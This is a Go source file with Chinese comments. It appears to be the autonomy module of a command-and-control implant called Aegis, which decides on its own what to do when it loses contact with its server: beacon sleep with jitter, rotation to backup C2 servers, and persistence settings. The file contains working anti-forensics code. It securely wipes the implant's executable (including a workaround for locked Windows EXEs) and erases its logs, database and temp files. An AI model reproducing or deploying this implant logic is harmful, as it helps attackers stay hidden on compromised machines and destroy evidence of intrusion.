// Package autonomy 提供 Payload 自主决策逻辑。
// 当 Agent 断网或处于高危状态时，根据预设的"生存策略"自主决定：
// - 深度休眠（延长心跳间隔）
// - 横向移动（尝试连接其他 Server URL）
// - 自毁清理（删除自身文件和痕迹）
// 而不是傻等服务端指令。
package autonomy

import (
	"bytes"
	"crypto/rand"
	"io"
	"log"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"time"
)

// Strategy 是自主生存策略。
type Strategy string

const (
	StratDeepSleep   Strategy = "deep_sleep"    // 深度休眠：大幅延长心跳
	StratTryRotate   Strategy = "try_rotate"    // 尝试轮换：切换到备用服务器
	StratSelfDestruct Strategy = "self_destruct" // 自毁清理
	StratPersist     Strategy = "persist"        // 保持现状：继续尝试
)

// Config 是自主决策的配置。
type Config struct {
	MaxConsecutiveFailures int           // 最大连续失败次数（触发自主决策的阈值）
	DeepSleepDuration      time.Duration // 深度休眠间隔
	DeepSleepJitter        time.Duration
	MaxRotations           int           // 最大服务器轮换次数
	SelfDestructOnFuse     bool          // Agent 熔断时是否自毁
	PersistMechanism       string        // 持久化机制（registry/task/svc）
}

// DefaultConfig 返回默认自主决策配置。
func DefaultConfig() *Config {
	return &Config{
		MaxConsecutiveFailures: 10,
		DeepSleepDuration:      30 * time.Minute,
		DeepSleepJitter:        15 * time.Minute,
		MaxRotations:           3,
		SelfDestructOnFuse:     false, // 默认不自毁，避免误触发
	}
}

// DecisionEngine 是自主决策引擎。
type DecisionEngine struct {
	cfg                *Config
	consecutiveFails  int
	rotationCount     int
	currentStrategy   Strategy
	lastDecision      time.Time
	mu                sync.Mutex
}

// NewDecisionEngine 创建自主决策引擎。
func NewDecisionEngine(cfg *Config) *DecisionEngine {
	if cfg == nil {
		cfg = DefaultConfig()
	}
	return &DecisionEngine{
		cfg:             cfg,
		currentStrategy: StratPersist,
	}
}

// RecordFailure 记录一次通信失败，当超过阈值时触发自主决策。
func (d *DecisionEngine) RecordFailure() Strategy {
	d.mu.Lock()
	defer d.mu.Unlock()

	d.consecutiveFails++
	d.lastDecision = time.Now()

	if d.consecutiveFails < d.cfg.MaxConsecutiveFailures {
		return StratPersist // 未达阈值，继续保持
	}

	// 达到阈值，触发自主决策
	decision := d.makeDecision()
	d.currentStrategy = decision
	return decision
}

// RecordSuccess 记录一次通信成功，重置失败计数。
func (d *DecisionEngine) RecordSuccess() {
	d.mu.Lock()
	defer d.mu.Unlock()
	d.consecutiveFails = 0
	d.rotationCount = 0
	d.currentStrategy = StratPersist
}

// makeDecision 根据当前状态做出自主决策。
func (d *DecisionEngine) makeDecision() Strategy {
	// 决策树：
	// 1. 如果配置了熔断自毁 → 自毁
	// 2. 如果服务器轮换未达上限 → 尝试轮换
	// 3. 否则 → 深度休眠

	if d.cfg.SelfDestructOnFuse {
		return StratSelfDestruct
	}

	if d.rotationCount < d.cfg.MaxRotations {
		d.rotationCount++
		return StratTryRotate
	}

	return StratDeepSleep
}

// GetSleepDuration 根据当前策略计算睡眠时间。
func (d *DecisionEngine) GetSleepDuration(base, jitter time.Duration) time.Duration {
	d.mu.Lock()
	defer d.mu.Unlock()

	switch d.currentStrategy {
	case StratDeepSleep:
		// 深度休眠：使用配置的长间隔 + 随机抖动
		sleep := d.cfg.DeepSleepDuration
		if d.cfg.DeepSleepJitter > 0 {
			jitterVal := randomDuration(d.cfg.DeepSleepJitter)
			sleep += jitterVal
		}
		return sleep
	case StratTryRotate:
		// 轮换策略：短暂等待后重试
		return base / 2 // 缩短间隔，快速尝试下一个服务器
	default:
		// 正常策略：使用基础间隔
		if jitter > 0 {
			jitterVal := randomDuration(jitter)
			base += jitterVal
		}
		return base
	}
}

// ShouldSelfDestruct 判断是否应该自毁。
func (d *DecisionEngine) ShouldSelfDestruct() bool {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.currentStrategy == StratSelfDestruct
}

// SelfDestruct 执行自毁清理。
// 删除自身文件、临时目录、注册表持久化项。
// P1-28 fix: On Windows, running EXE can't be deleted — rename to temp first.
func (d *DecisionEngine) SelfDestruct() error {
	log.Printf("[autonomy] SELF DESTRUCT INITIATED")

	// 1. 删除自身可执行文件
	exePath, err := os.Executable()
	if err == nil {
		if runtime.GOOS == "windows" {
			// Windows can't delete a running EXE. Rename to temp, then try delete.
			tmpPath := filepath.Join(os.TempDir(), filepath.Base(exePath)+".tmp")
			if os.Rename(exePath, tmpPath) == nil {
				secureDelete(tmpPath)
			} else {
				// Fallback: overwrite with zeros and try delete anyway
				overwriteFile(exePath)
				os.Remove(exePath)
			}
		} else {
			secureDelete(exePath)
		}
	}

	// 2. 删除临时文件
	tmpDir := os.TempDir()
	filepath.Walk(tmpDir, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil
		}
		if info.Mode().IsRegular() && isAegisFile(info.Name()) {
			secureDelete(path)
		}
		return nil
	})

	// 3. 清理内存（通过 panic 退出）
	log.Printf("[autonomy] SELF DESTRUCT COMPLETE")
	return nil
}

// overwriteFile overwrites a file with zeros (fallback for locked Windows EXE).
func overwriteFile(path string) {
	f, err := os.OpenFile(path, os.O_WRONLY|os.O_TRUNC, 0)
	if err != nil {
		return
	}
	defer f.Close()
	info, _ := os.Stat(path)
	if info != nil {
		f.Write(make([]byte, info.Size()))
	}
}

// GetConsecutiveFailures 返回连续失败次数。
func (d *DecisionEngine) GetConsecutiveFailures() int {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.consecutiveFails
}

// GetCurrentStrategy 返回当前策略。
func (d *DecisionEngine) GetCurrentStrategy() Strategy {
	d.mu.Lock()
	defer d.mu.Unlock()
	return d.currentStrategy
}

// randomDuration 返回 0 到 max 之间的随机时间。
func randomDuration(max time.Duration) time.Duration {
	maxMs := max.Milliseconds()
	if maxMs <= 0 {
		return 0
	}
	b := make([]byte, 8)
	rand.Read(b)
	val := int64(uint64(b[0])<<56 | uint64(b[1])<<48 | uint64(b[2])<<40 | uint64(b[3])<<32 |
		uint64(b[4])<<24 | uint64(b[5])<<16 | uint64(b[6])<<8 | uint64(b[7]))
	if val < 0 {
		val = -val
	}
	return time.Duration(val%int64(maxMs)) * time.Millisecond
}

// secureDelete 安全删除文件（覆写后删除）。
func secureDelete(path string) {
	// 获取文件大小
	info, err := os.Stat(path)
	if err != nil {
		return
	}

	// 覆写（3 遍：随机数据 → 0x00 → 0xFF）
	f, err := os.OpenFile(path, os.O_WRONLY, 0)
	if err != nil {
		os.Remove(path)
		return
	}
	defer f.Close()

	size := info.Size()

	// 第 1 遍：随机数据
	buf := make([]byte, 4096)
	for written := int64(0); written < size; {
		rand.Read(buf)
		n, _ := f.Write(buf)
		written += int64(n)
	}
	f.Sync()

	// 第 2 遍：0x00 覆写
	f.Seek(0, io.SeekStart)
	zeroBuf := make([]byte, 4096)
	for written := int64(0); written < size; {
		n, _ := f.Write(zeroBuf)
		written += int64(n)
	}
	f.Sync()

	// 第 3 遍：0xFF 覆写
	f.Seek(0, io.SeekStart)
	ffBuf := bytes.Repeat([]byte{0xFF}, 4096)
	for written := int64(0); written < size; {
		n, _ := f.Write(ffBuf)
		written += int64(n)
	}
	f.Sync()

	// 关闭并删除
	f.Close()
	os.Remove(path)
}

// isAegisFile 判断文件名是否属于 Aegis。
// 仅匹配已知的 Aegis 文件模式，避免误删。
func isAegisFile(name string) bool {
	switch name {
	case "aegis.db", "audit.log", "aegis.log", "config.json":
		return true
	default:
		// 匹配 aegis-*.tmp、aegis_*.bin 等临时文件
		if len(name) > 7 && name[:6] == "aegis-" && strings.HasSuffix(name, ".tmp") {
			return true
		}
		if len(name) > 7 && name[:6] == "aegis_" && strings.HasSuffix(name, ".bin") {
			return true
		}
		return false
	}
}
